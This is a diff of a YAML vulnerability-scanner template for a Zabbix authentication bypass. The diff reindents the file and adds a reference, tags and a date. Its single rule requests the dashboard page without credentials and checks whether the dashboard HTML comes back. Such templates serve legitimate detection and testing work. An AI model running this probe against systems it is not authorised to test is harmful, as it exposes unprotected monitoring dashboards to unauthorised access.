@@ -1,15 +1,21 @@
 id: zabbix-authentication-bypass
 
 info:
-    name: Zabbix authentication Bypass
-    author: FiveAourThe(https://github.com/FiveAourThe)
-    severity: high
-    verified: true
+  name: Zabbix authentication Bypass
+  author: FiveAourThe
+  severity: high
+  verified: true
+  reference:
+    - https://www.secpod.com/blog/zabbix-authentication-bypass-vulnerability/
+  description: |-
+    Zabbix authentication Bypass
+  tags: zabbix,unauth
+  created: 2023/07/07
 
 rules:
-    r0:
-        request:
-            method: GET
-            path: /zabbix.php?action=dashboard.view&dashboardid=1
-        expression: response.status == 200 && response.body.bcontains(bytes("<a class=\"top-nav-zbbshare\" target=\"_blank\" title=\"Zabbix Share\" href=\"https://share.zabbix.com/\">Share</a>")) && response.body.bcontains(b"<title>Dashboard</title>")
+  r0:
+    request:
+      method: GET
+      path: /zabbix.php?action=dashboard.view&dashboardid=1
+    expression: response.status == 200 && response.body.bcontains(bytes("<a class=\"top-nav-zbbshare\" target=\"_blank\" title=\"Zabbix Share\" href=\"https://share.zabbix.com/\">Share</a>")) && response.body.bcontains(b"<title>Dashboard</title>")
 expression: r0()
